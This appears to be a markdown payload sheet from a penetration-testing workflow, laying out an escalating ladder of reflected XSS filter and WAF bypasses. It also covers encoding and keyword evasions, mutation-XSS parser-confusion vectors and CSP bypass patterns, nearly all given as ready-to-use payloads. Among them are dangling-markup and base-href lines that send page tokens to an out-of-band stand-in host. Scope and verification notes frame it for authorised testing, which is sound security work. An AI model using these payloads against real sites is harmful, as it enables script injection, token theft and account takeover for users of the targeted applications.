# Filter / WAF bypass ladder for reflected XSS (step 6)
# Escalate only when the prior rung is blocked (mirror of the fetch ladder philosophy).
# Record every attempt in payloads_tried.jsonl: {payload, encoding, blocked, reflected, executed}.
# Stay in scope + rate-limited (roe-gate.md). The PoC must be the payload that ACTUALLY executed.

## Rung 0 — plain
`<svg onload=alert(1)>`

## Rung 1 — case / whitespace
```
<SvG OnLoAd=alert(1)>
<svg/onload=alert(1)>
<svg%09onload=alert(1)>      # tab
<svg%0aonload=alert(1)>      # newline
```

## Rung 2 — HTML entities / numeric refs (attribute & handler)
```
&#x6a;avascript:alert(1)           # javascript: in href
<img src=x onerror=&#97;lert(1)>
<svg onload=alert&#40;1&#41;>
```

## Rung 3 — URL / double / mixed encoding (reflected via query)
```
%3Csvg%20onload%3Dalert(1)%3E
%253Csvg...%253E                   # double-encode if one layer is stripped
```

## Rung 4 — no-parentheses / no-space / alt sinks (char or keyword filters)
```
<svg onload=alert`1`>              # backtick call
<img src=x onerror=alert`1`>
<svg><script>alert&#40;1&#41</script>
<svg onload=top[/al/.source+/ert/.source](1)>   # keyword split
```

## Rung 5 — tag/attr variety (blocklist gaps)
```
<body onresize=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<x contenteditable onbeforeinput=alert(1)>
```

## Rung 6 — unicode / mutation / exotic
```
<svg onload=alert(1)>
<noscript><p title="</noscript><svg onload=alert(1)>">   # mXSS
```

## Notes
- Identify WHICH character/keyword is filtered (break it down), then pick the lowest rung that bypasses it — don't jump to rung 6.
- A payload that is *reflected but encoded* is NOT a bypass. Confirm execution (verify.md).
- If a CSP blocks inline handlers, look for an allowed-source gadget or report as "reflected, non-executing under CSP" (low/info).

---

## Extended arsenal — encoding & character-set evasion
### HTML entity encoding (attribute / handler / scheme contexts)
Entities decode in HTML attribute & text contexts but NOT inside a raw `<script>` block. `javascript:`
is matched AFTER entity-decode, so entity-encoding any scheme char defeats keyword filters.
```
&#106;avascript:alert(1)            # decimal
&#0000106;avascript:alert(1)        # zero-padded decimal
&#x6a;avascript:alert(1)            # hex
&#X6A;avascript:alert(1)            # uppercase X
&#106avascript:alert(1)             # missing ; (decodes before a non-digit)
java&Tab;script:alert(1)            # named ref TAB
java&NewLine;script:alert(1)        # named ref newline
javascript&colon;alert(1)           # &colon; for :
alert&lpar;1&rpar;                  # &lpar;/&rpar; for ( )
<img src=x onerror=&#97;lert(1)>    # entity in a handler value
```
### JS numeric / unicode escapes (JS string or code context)
```
\x61lert(1)                         # \xHH
alert(1)                       # \uHHHH
\u{61}lert(1)                       # ES6 \u{...}
\141lert(1)                         # octal (legacy)
'\x3cimg src=x onerror=alert(1)\x3e'    # build markup inside a JS string sink
```
### URL encoding layers
```
%3Csvg%20onload%3Dalert(1)%3E       # single
%253Csvg%2520onload%253D...%253E    # double (one layer stripped upstream)
%u003Csvg...                        # %uXXXX (legacy IIS/.NET)
%c0%bc svg...                       # overlong UTF-8 '<' (legacy decoders)
```
### Whitespace & separator swaps (tag ↔ attr ↔ handler)
Valid separators: space `%20`, TAB `%09`, LF `%0a`, CR `%0d`, FF `%0c`, `/`, and (some engines) VT `%0b`.
```
<svg/onload=alert(1)>
<svg%09onload=alert(1)>
<svg%0conload=alert(1)>
<svg//onload=alert(1)>
<img/src=x/onerror=alert(1)>
<svg onload%20=alert(1)>            # space around the =
```

## Extended arsenal — call/keyword evasion (char & keyword blocklists)
### Build the string without the literal keyword
```
top['al'+'ert'](1)
top[/al/.source+/ert/.source](1)
window['\x61lert'](1)
self[atob('YWxlcnQ=')](1)
window[String.fromCharCode(97,108,101,114,116)](1)
eval(atob('YWxlcnQoMSk='))          # base64 alert(1)
Function('alert(1)')()
setTimeout('alert(1)')
```
### No-parentheses calls
```
<svg onload="window.onerror=eval;throw'=alert\x281\x29'">
<img src=x onerror="throw onerror=alert,1">
<img src=x onerror=alert%26%230000041;1)>    # entity ( inside a handler
location=name                                 # with window.name='javascript:alert(1)'
```
### No-space / slash-only
```
<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
```

## Extended arsenal — mutation XSS (mXSS) parser-confusion
The sanitizer sees inert markup; the browser re-parses the serialized output into live markup. Prime
targets: output sanitized THEN re-inserted via `innerHTML`, and HTML↔SVG↔MathML foreign-content switches.
```
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><p><style><!--</style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>     # some rich renderers decode
<img src="x`<img src=x onerror=alert(1)>">               # backtick-attr mutation (legacy)
<table><caption><svg><style><img src=x onerror=alert(1)>  # foster-parenting
```
mXSS is browser/parser-version-specific — confirm EXECUTION in the real target build; a vector that
mutates in one engine can be inert in another.

## Extended arsenal — CSP bypass patterns
Read the policy first: `script-src`, `object-src`, `base-uri`, `default-src`, and whether
`unsafe-inline`/`unsafe-eval`/`strict-dynamic`/nonces/hashes are present.
### Weak-policy gaps
```
# 'unsafe-inline' present → any inline handler/script runs (policy is cosmetic)
# missing object-src → <object data=//HOST/x> / data: plugin payloads (legacy)
# missing base-uri + a later relative <script src=rel.js> → <base href=//HOST/> hijacks it
# wildcard/host-by-path or http: scheme-source → host your script on an allowed origin
```
### Allowlisted-origin gadgets
```
# JSONP on an allowlisted host → arbitrary call:
<script src="//ALLOWED.cdn/api/jsonp?callback=alert(1)//"></script>
# open redirect on an allowlisted host → bounce to your JS (when src allows that host by path)
# framework "script gadget" files on an allowlisted CDN that turn benign markup into execution
#   under 'unsafe-eval' (template loaders, data-binding bootstrappers)
```
### Nonce / hash flaws
```
<script nonce=REFLECTED_NONCE>alert(1)</script>     # nonce echoed in the response & reusable
# predictable/static nonce across responses → reuse it
# 'strict-dynamic' + an injectable trusted script that createElement('script') from your input
```
### base-uri / dangling-markup capture (no script needed)
```
<base href=//TOKEN.oob.example/>    # base-uri unset → relative resource loads go to OOB
<img src='//TOKEN.oob.example/c?    # unterminated attr swallows markup (incl. a nonce/token) to OOB
```
Dangling markup is data-exfil / token-capture, not code exec — rate it accordingly; keep the sink a
benign `TOKEN.oob.example`.
### Downgrade honesty
Tight allowlist + no inline + no eval + no gadget ⇒ record "reflected, non-executing under CSP"
(info/low). Reflection is not a bypass (verify.md).
